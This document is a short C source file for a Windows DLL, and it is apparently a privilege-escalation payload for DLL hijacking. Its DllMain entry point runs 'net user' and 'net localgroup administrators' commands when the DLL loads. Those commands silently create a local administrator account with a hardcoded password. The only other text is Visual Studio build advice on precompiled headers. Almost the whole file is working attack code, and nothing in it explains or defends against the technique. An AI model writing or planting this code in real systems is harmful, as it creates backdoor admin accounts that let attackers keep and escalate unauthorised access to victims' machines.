#include <stdlib.h>
#include <windows.h>

// compile with visual studio
// To turn off precompiled headers because of 'C1010 unexpected end of file while looking for precompiled header. Did you forget to add '#include "pch.h"' to your source?'
//
// 1. project : select , and open 'properties'
// 2. configuration: select , All Configurations
// 3. select , C/C++ / PreCompiled Headers
// 4. select , Not Using Precompiled Headers

BOOL APIENTRY DllMain(
    HANDLE hModule,// Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved) // Reserved
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system("net user ffake p@ssw3rd135246 /add");
        i = system("net localgroup administrators ffake /add");
        break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
    case DLL_THREAD_DETACH: // A thread exits normally.
        break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
